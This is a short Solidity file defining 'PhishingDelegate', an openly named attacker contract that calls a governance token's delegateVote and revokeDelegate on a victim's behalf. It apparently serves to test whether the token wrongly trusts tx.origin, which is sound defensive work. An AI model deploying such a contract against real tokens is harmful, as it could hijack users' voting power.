// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IGovernanceToken {
    function delegateVote(address to) external;
    function revokeDelegate() external;
}

contract PhishingDelegate {
    IGovernanceToken public immutable token;

    constructor(address _token) {
        token = IGovernanceToken(_token);
    }

    function attackDelegate(address to) external {
        token.delegateVote(to);
    }

    function attackRevoke() external {
        token.revokeDelegate();
    }
}
